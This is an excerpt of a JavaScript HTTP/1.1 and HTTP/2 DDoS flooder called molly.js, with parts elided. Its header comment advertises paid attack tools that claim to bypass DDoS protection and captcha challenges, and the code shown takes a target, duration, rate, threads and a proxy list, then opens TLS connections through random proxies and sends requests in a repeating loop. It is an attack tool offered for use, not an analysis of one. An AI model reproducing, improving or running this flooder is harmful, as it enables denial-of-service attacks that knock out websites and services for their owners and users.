/*
 __  __  ___  _     _  __   __      _ ____  
|  \/  |/ _ \| |   | | \ \ / /     | / ___| 
| |\/| | | | | |   | |  \ V /   _  | \___ \ 
| |  | | |_| | |___| |___| |   | |_| |___) |
|_|  |_|\___/|_____|_____|_|    \___/|____/ 


Method created by Molly aka @cfturnstile

NOTE: Its my old flooder from september, i has a better golang alternative now. Im keep selling methods and you can message me

Currently now im selling

 400$ - mollyflooder - HTTP/1.1, HTTP/2 Flooder with 100% HTTP-DDoS Bypass and many options for greatest bypassing (POST Data supported)
1000$ - mollybrowser - HTTP/1.1, HTTP/2 Browser method based on Chromium, has device information spoofing and greatest optimization and can hold any your target with CloudFlare captca for long time
*/
...
if (process.argv.length < 7) {
     console.log("molly.js // Author @cfturnstile // 26 September");
     console.log("usage: ./flood [target] [time] [rate] [threads] [proxy-file] <arguments>");
     console.log("aruments: --debug, --cookie, --proxy, --http, --ua, --exploit, --sleep, --path, --query");
     process.exit(0);
}
...
function go() {
     ...
     if (proxy) {
          ...
          [proxyHost, proxyPort] = proxies[~~(Math.random() * proxies.length)].split(':');
     }
               ...
               SocketTLS = tls.connect({
                    ...
                    SocketTLS.on('data', (eventData) => {
                         ...
                         while (data.length >= 9) {
                              ...
                              if (frame) {
                                   ...
                                   if (frame.type == 0) {
                                        // DATA frame
                                        console.log(hpack.decode(frame.payload))
                    ...
                    function main() {
                         ...
                         for (let i = 0; i < ratelimit; i++) {
                              ...
                              //     requests_sent = 0;
                              // }
                              //if (streamId > 1000) console.log("return"); return
                              streamId += 2;
                         }
                         setTimeout(() => {
                              main()
